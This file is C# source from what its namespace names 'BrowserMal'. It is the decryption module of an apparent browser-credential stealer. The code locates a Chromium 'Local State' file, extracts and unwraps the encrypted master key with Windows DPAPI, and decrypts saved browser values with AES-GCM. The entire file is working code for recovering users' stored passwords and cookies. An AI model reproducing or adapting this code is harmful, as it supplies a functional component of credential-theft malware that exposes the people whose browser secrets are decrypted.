﻿using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace BrowserMal.AES
{
    public class AesGcm256
    {
        public static string DecryptNoKey(byte[] encrypted)
        {
            if (encrypted == null || encrypted.Length == 0)
                return null;

            string result = string.Empty;
            try
            {
                result = Encoding.UTF8.GetString(ProtectedData.Unprotect(encrypted, null, DataProtectionScope.CurrentUser));
            }
            catch (Exception)
            {

            }
            return result;
        }

        public static byte[] GetMasterKey(string basePath)
        {
            string parentPath = Directory.GetParent(basePath).Parent.FullName;
            string path = parentPath + "\\Local State";

            if (!System.IO.File.Exists(path))
            {
                parentPath = Path.GetDirectoryName(basePath);
                path = parentPath + "\\Local State";
            }

            if (!System.IO.File.Exists(path))
                return null;

            string jsonString = System.IO.File.ReadAllText(path);

            dynamic jsonObject = JsonConvert.DeserializeObject(jsonString);
            string key = jsonObject.os_crypt.encrypted_key;

            byte[] src = Convert.FromBase64String(key);
            byte[] encryptedKey = src.Skip(5).ToArray();

            return ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
        }

        public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
        {
            var decryptedValue = string.Empty;
            try
            {
                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters);

                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                var retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                decryptedValue = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
            }
            catch (Exception)
            {
            }

            return decryptedValue;
        }

        public static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
        {
            nonce = new byte[12];
            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

            Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
            Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
        }
    }
}
